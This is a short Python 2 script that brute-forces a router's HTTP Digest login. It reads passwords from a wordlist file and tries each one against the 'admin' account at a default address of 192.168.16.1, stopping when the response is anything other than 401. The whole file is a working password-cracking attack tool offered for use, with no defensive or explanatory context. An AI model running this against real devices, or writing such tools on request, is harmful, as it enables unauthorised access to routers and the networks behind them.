#!/usr/bin/env python
#coding:utf-8
__author__="VegetableCat"  
import requests
from requests.auth import HTTPDigestAuth
import argparse
import sys
import os


def crack(dict,url,offset):
    i=0
    with open(os.path.join('dict',dict)) as f:
        l = os.popen('wc -l %s' % os.path.join('dict',dict)).read().split()[0]
        while True:
            i=i+1
            password = f.readline()[offset:]
            if password == '':
                print "[!] password not found!"
                break
            try:
                r = requests.get(url, auth=HTTPDigestAuth('admin', '%s' % password))
            except KeyboardInterrupt,e:
                with open('crack.log','a') as log:
                    log.write('cracking:%s at line:%s'% (password,i))
                    sys.exit(-1)

            if r.status_code <> 401:
                print "[!] Found password: %s" % password
                break
            else:
                print "[!] try %s/%s wrong: %s" % (i,l,password)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-d',help='the dict file you want to load' ,dest='d')
    parser.add_argument('-u',help='the router url,default is http://192.168.16.1',dest='u',default='http://192.168.16.1')
    parser.add_argument('-o',help='the offset of password',dest='offset',type=int)


    args = parser.parse_args()

    dict   = args.d
    url    = args.u
    offset = args.offset

    type(offset)

    if dict == None:
        print "[!] plz select dict_file!"
        parser.print_help()
        sys.exit(-1)

    crack(dict,url,offset)



if __name__ == '__main__':
    main()

